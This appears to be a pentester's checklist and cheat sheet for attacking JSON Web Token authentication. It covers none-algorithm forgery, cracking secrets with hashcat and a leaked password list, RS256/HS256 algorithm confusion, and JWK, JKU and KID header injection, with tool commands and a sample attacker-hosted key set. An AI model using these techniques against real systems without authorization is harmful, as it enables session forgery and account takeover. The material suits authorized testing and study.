- [ ] Identify JWT token headers (Authorization Bearer, Cookies?)
- [ ] Check payload modification, payload attack JWT
- [ ] None-algorithm attack, header attack JWT
- [ ] Check signing attack JWT
- [ ] Algorithm Confusion Attack 
- [ ] JWT Parameters Attack
- [ ] JWT secret re-used across different domains

(jwt_tool.py) JWT analysis
```bash
python3 jwt_tool.py <JWT_TOKEN>
```
## Header-based Attack
None-algorithm
- CyberChef
```json
{
	"alg": None, 
	"typ": "JWT",
}
```
(jwt_tool.py) None-algorithm attack
```bash
python3 jwt_tool.py -X a <JWT_TOKEN>
```
## Signing-based Attacks
(hashcat) Cracking JWT secret
```bash
hashcat -m 16500 jwt.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
Algorithm Confusion (RS256)
- Use a different algorithm to sign token (HS256)
```bash
python3 jwt_forgery.py <JWT_TOKEN1> <JWT_TOKEN2>
```
## Parameter Attacks
### JWK parameter
- Burp Suite JWT Editor
Create of public key to for the server to confirm signature validity.
1. Generate new RSA
2. Edit the payload 
3. Attack > Embedded JWK
4. Use the serialized JWT
![](../../img/Pasted%20image%2020251227113220.png)
### JKU parameter
- JKU collab endpoint
- Host `/.well-known/jwks.json`
```json
{ 
	"keys": [ 
		{ 
			"kty": "RSA", 
			"e": "AQAB", 
			"kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab", 
			"n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ" 
		}, 
		{ 
			"kty": "RSA", 
			"e": "AQAB", 
			"kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA", 
			"n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw" 
		} 
	]
}
```
### KID parameter
- Scan like every other server-side input validation bug (SQLi, path traversal...)
## Algorithm Confusion